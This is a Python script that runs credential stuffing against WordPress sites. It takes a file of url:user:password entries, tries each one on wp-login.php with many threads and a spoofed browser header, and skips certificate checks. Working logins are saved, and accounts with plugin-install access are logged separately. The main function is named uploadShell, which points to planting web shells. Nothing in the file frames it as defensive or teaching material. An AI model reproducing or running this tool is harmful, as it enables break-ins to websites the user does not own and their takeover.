import requests
from multiprocessing.dummy import Pool as ThreadPool
import re
import os
import urllib3

# Suppress SSL warnings for sites with expired certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ANSI Color Codes
G = '\033[0;32m'  # Green
W = '\033[0;37m'  # White
R = '\033[0;31m'  # Red
C = '\033[1;36m'  # Cyan
Y = '\033[0;33m'  # Yellow
B = '\033[0;34m'  # Blue
M = '\033[0;35m'  # Magenta

def print_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f'''{C}
        ╔══════════════════════════════════════════════════╗
        ║              WordPress Login Checker             ║
        ║      Support: url:user:pass & url#user@pass      ║
        ║        Path Finder: Auto-detects wp-login        ║
        ╚══════════════════════════════════════════════════╝
        {W}''')

def uploadShell(site):
    site_url, user, pasw = None, None, None
    try:
        # Format Parsing Logic
        if '#' in site and '@' in site:
            match = re.search(r'^(.*?)#(.*?)@(.*)$', site)
            if match:
                site_url, user, pasw = match.groups()
        elif site.count(':') >= 3:
            parts = site.split(':')
            site_url = ':'.join(parts[:-2])
            user = parts[-2]
            pasw = parts[-1]

        if not site_url or not user or not pasw:
            return

        if not site_url.startswith(('http://', 'https://')):
            site_url = 'http://' + site_url
        
        site_url = site_url.rstrip('/')
        hd = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0'}
        r = requests.Session()
        
        print(f' {W}[{B}⏳{W}] Scanning: {site_url}')
        
        # 1. Path Detection
        # Try default first, then look for hidden paths in the source
        paths_to_try = ['/wp-login.php', '/wp/wp-login.php', '/blog/wp-login.php']
        final_login_url = None
        
        initial_check = r.get(site_url, timeout=10, verify=False, headers=hd)
        
        # Search for custom login paths if default isn't obvious
        if 'wp-content' in initial_check.text or 'wp-includes' in initial_check.text:
            for path in paths_to_try:
                test_url = site_url + path
                if r.get(test_url, timeout=7, verify=False).status_code == 200:
                    final_login_url = test_url
                    break
        
        if not final_login_url:
            final_login_url = site_url + '/wp-login.php'

        # 2. Attempt Login
        login_data = {
            'log': user,
            'pwd': pasw,
            'wp-submit': 'Log In',
            'redirect_to': site_url + '/wp-admin/',
            'testcookie': 1
        }
        
        res = r.post(final_login_url, data=login_data, headers=hd, timeout=12, verify=False)
        
        # 3. Success Verification
        success_indicators = ['dashboard', 'wp-admin', 'user-new.php', 'profile.php', 'Log Out']
        
        if any(indicator in res.text.lower() for indicator in success_indicators):
            print(f' {W}[{G}✓{W}] {site_url} --> {G}SUCCESS{W} ({user})')
            with open('loginSuccess.txt', 'a') as f:
                f.write(f"{site_url}/wp-login.php:{user}:{pasw}\n")
            
            # Feature check
            if 'plugin-install.php' in res.text:
                with open('admin_access.txt', 'a') as f:
                    f.write(f"{site_url}:{user}:{pasw}\n")
        else:
            print(f' {W}[{R}✗{W}] {site_url} --> {R}FAILED{W}')
            
    except Exception:
        pass # Silently skip errors to keep terminal clean

if __name__ == "__main__":
    print_banner()
    
    file_name = input(f' {W}[{C}?{W}] List file: ')
    if not os.path.exists(file_name):
        print(f" {R}File not found!{W}")
        exit()
    
    try:
        threads = int(input(f' {W}[{C}?{W}] Threads: '))
    except:
        threads = 10

    sites = open(file_name, 'r', encoding='utf-8', errors='ignore').read().splitlines()
    
    print(f'\n {W}[{G}▶{W}] Starting Multi-Format Checker...\n')
    
    pool = ThreadPool(threads)
    pool.map(uploadShell, sites)
    pool.close()
    pool.join()
    
    print(f'\n {W}[{G}✓{W}] Done. Success results in loginSuccess.txt{W}')
